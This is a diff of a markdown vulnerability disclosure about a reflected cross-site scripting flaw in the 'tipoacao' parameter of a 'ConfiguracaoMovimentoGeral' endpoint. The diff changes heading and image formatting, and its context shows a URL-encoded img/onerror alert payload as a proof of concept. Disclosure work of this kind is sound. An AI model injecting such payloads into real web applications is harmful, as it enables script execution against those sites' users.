@@ -1,4 +1,4 @@
-Cross-Site Scripting (XSS) Reflected endpoint `/module/Configuracao/ConfiguracaoMovimentoGeral` parameter `tipoacao`
+# Cross-Site Scripting (XSS) Reflected endpoint `/module/Configuracao/ConfiguracaoMovimentoGeral` parameter `tipoacao`
 
 ---
 
@@ -52,11 +52,13 @@ Priority: u=0, i
 tipoacao=Editar%22%3E%3Cimg%20src=x%20onerror=alert('XSS-PoC4')%3E
 ```
 
-![[Pasted image 20250817003111.png]]
+<img width="838" height="577" alt="Pasted image 20250817003111" src="https://github.com/user-attachments/assets/c7b15a1a-70cf-483d-bc05-99d451c68125" />
+
 
 The result:
 
-![[Pasted image 20250817003156.png]]
+<img width="746" height="542" alt="Pasted image 20250817003156" src="https://github.com/user-attachments/assets/e4b6a1cf-1893-4217-88ee-e52729ab6151" />
+
 
 
 ---
